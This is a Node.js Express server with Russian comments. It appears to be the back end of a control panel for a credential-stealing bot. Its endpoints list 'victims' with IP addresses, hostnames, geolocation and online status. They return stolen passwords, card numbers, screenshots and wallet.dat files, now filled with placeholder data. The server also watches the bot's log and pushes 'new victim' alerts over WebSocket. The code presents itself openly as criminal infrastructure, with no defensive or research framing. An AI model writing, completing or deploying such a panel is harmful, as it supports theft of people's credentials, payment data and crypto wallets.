// server.js - API сервер для веб-панели
const express = require('express');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const { spawn } = require('child_process');
const fs = require('fs');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'webpanel/dist')));

// ========== WebSocket уведомления ==========
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

// Функция для отправки уведомлений всем клиентам
function broadcastNotification(type, message) {
  io.emit('notification', {
    type,
    message,
    timestamp: Date.now()
  });
}

// ========== API endpoints ==========

// Статистика
app.get('/api/stats', (req, res) => {
  try {
    // Здесь вы должны получать данные из вашей базы данных
    // Это заглушка, замените на реальные запросы к БД
    const stats = {
      total_victims: 42,
      online_victims: 7,
      total_logs: 1250,
      total_files: 89,
      countries: {
        'US': 15,
        'RU': 10,
        'DE': 5,
        'GB': 4,
        'Other': 8
      }
    };
    res.json(stats);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Список жертв
app.get('/api/victims', (req, res) => {
  try {
    // Заглушка, замените на реальные данные из БД
    const victims = [
      {
        victim_id: 'victim_1',
        ip_address: '192.168.1.1',
        hostname: 'DESKTOP-ABC',
        country: 'US',
        city: 'New York',
        latitude: 40.7128,
        longitude: -74.0060,
        last_seen: new Date().toISOString(),
        is_online: true
      },
      {
        victim_id: 'victim_2',
        ip_address: '10.0.0.2',
        hostname: 'LAPTOP-XYZ',
        country: 'RU',
        city: 'Moscow',
        latitude: 55.7558,
        longitude: 37.6173,
        last_seen: new Date(Date.now() - 3600000).toISOString(),
        is_online: false
      }
    ];
    res.json(victims);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Детальная информация о жертве
app.get('/api/victims/:id', (req, res) => {
  try {
    const { id } = req.params;
    // Заглушка, замените на реальные данные из БД
    res.json({
      victim_id: id,
      ip_address: '192.168.1.1',
      hostname: 'DESKTOP-ABC',
      username: 'john_doe',
      os_version: 'Windows 11 Pro',
      country: 'US',
      city: 'New York',
      latitude: 40.7128,
      longitude: -74.0060,
      first_seen: '2026-03-01T10:00:00Z',
      last_seen: new Date().toISOString(),
      is_online: true,
      logs: [
        { type: 'password', content: 'facebook.com: john: pass123', created_at: new Date().toISOString() },
        { type: 'card', content: 'VISA ****4242', created_at: new Date().toISOString() },
      ],
      files: [
        { id: 1, name: 'screenshot_1.png', type: 'screenshot', size: 234567, created_at: new Date().toISOString() },
        { id: 2, name: 'wallet.dat', type: 'wallet', size: 1048576, created_at: new Date().toISOString() },
      ]
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Недавняя активность
app.get('/api/recent-activity', (req, res) => {
  try {
    // Заглушка
    const activities = [
      { victim_id: 'victim_1', type: 'password', content: 'New password captured', timestamp: Date.now() - 60000 },
      { victim_id: 'victim_2', type: 'login', content: 'Victim came online', timestamp: Date.now() - 120000 },
    ];
    res.json(activities);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Скачивание файла
app.get('/api/files/:id', (req, res) => {
  try {
    const { id } = req.params;
    // Здесь должна быть логика поиска файла в БД и отправки
    // Заглушка
    res.status(404).json({ error: 'File not found' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Ping для UptimeRobot
app.get('/ping', (req, res) => {
  res.send('pong');
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ========== Интеграция с Python ботом ==========
// Функция для получения данных из базы данных бота
// Вы можете импортировать Python модуль или читать SQLite напрямую
async function getBotStats() {
  // TODO: Реализовать получение реальных данных из БД
  // Например, через чтение SQLite файла или вызов Python функции
  return null;
}

// Слушаем уведомления от Python бота (можно через файл или сокет)
const watchLogs = () => {
  const logFile = path.join(__dirname, 'logs', 'bot.log');

  if (!fs.existsSync(logFile)) {
    fs.writeFileSync(logFile, '');
  }

  fs.watch(logFile, (eventType, filename) => {
    if (eventType === 'change') {
      const data = fs.readFileSync(logFile, 'utf8');
      const lines = data.split('\n').filter(l => l.trim());
      const lastLine = lines[lines.length - 1];

      if (lastLine.includes('New victim')) {
        broadcastNotification('new_victim', lastLine);
      } else if (lastLine.includes('New log')) {
        broadcastNotification('new_log', lastLine);
      }
    }
  });
};

watchLogs();

// ========== Запуск сервера ==========
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`API Server running on port ${PORT}`);
  console.log(`WebSocket server available`);
});
